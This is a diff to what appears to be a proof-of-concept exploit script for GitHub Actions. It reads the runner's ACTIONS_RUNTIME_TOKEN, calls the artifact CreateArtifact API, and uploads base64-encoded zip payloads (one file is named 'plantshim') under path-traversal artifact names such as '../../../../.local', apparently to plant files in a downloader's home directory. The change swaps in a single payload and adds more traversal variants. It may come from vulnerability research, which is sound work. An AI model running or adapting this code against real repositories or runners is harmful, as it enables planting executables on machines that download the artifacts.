@@ -1,11 +1,10 @@
 const fs = require('fs');
 const crypto = require('crypto');
-const zipFlat = Buffer.from(fs.readFileSync(__dirname + '/evil_gh_flat.b64', 'utf8').trim(), 'base64');
-const zipBin = Buffer.from(fs.readFileSync(__dirname + '/evil_gh_bin.b64', 'utf8').trim(), 'base64');
-const zipBenign = Buffer.from(fs.readFileSync(__dirname + '/benign.b64', 'utf8').trim(), 'base64');
+const zipPlant = Buffer.from(fs.readFileSync(__dirname + '/plantshim.b64', 'utf8').trim(), 'base64');
 
 const token = process.env.ACTIONS_RUNTIME_TOKEN;
 const base = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');
+console.log('runtime env present: token=' + !!token + ' url=' + !!base);
 if (!token || !base) { console.log('missing runtime env'); process.exit(1); }
 const scp = JSON.parse(Buffer.from(token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/'), 'base64').toString()).scp;
 const scope = scp.split(' ').find(s => s.startsWith('Actions.Results:'));
@@ -18,14 +17,14 @@ async function twirp(method, body) {
     body: JSON.stringify(body)
   });
   const txt = await r.text();
-  console.log(method + ' http ' + r.status + ' body ' + txt.slice(0, 500));
+  console.log(method + ' http ' + r.status + ' body ' + txt.slice(0, 300));
   try { return JSON.parse(txt); } catch { return {}; }
 }
 
 async function upload(name, zip) {
-  console.log('--- uploading artifact name=' + JSON.stringify(name));
+  console.log('--- CreateArtifact name=' + JSON.stringify(name));
   const c = await twirp('CreateArtifact', {workflow_run_backend_id: runBackend, workflow_job_run_backend_id: jobBackend, name, mime_type: 'application/zip', version: 7});
-  if (!c.signed_upload_url) { console.log('NO_UPLOAD_URL for ' + JSON.stringify(name)); return; }
+  if (!c.signed_upload_url) { console.log('NO_UPLOAD_URL name=' + JSON.stringify(name)); return; }
   const put = await fetch(c.signed_upload_url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip', 'x-ms-blob-content-type': 'application/zip'}, body: zip});
   console.log('put status: ' + put.status);
   const hash = crypto.createHash('sha256').update(zip).digest('hex');
@@ -34,8 +33,8 @@ async function upload(name, zip) {
 }
 
 (async () => {
-  await upload('../../../../.local/bin', zipFlat);
-  await upload('../../../../.local/bin/x', zipFlat);
-  await upload('../../../../.local', zipBin);
-  await upload('plain-doc', zipBenign);
+  await upload('../../../../.local', zipPlant);
+  await upload('../../../.././.local', zipPlant);
+  await upload('../../../.././/.local', zipPlant);
+  await upload('plain-doc', zipPlant);
 })().catch(e => { console.log('ERR ' + e.message); process.exit(1); });
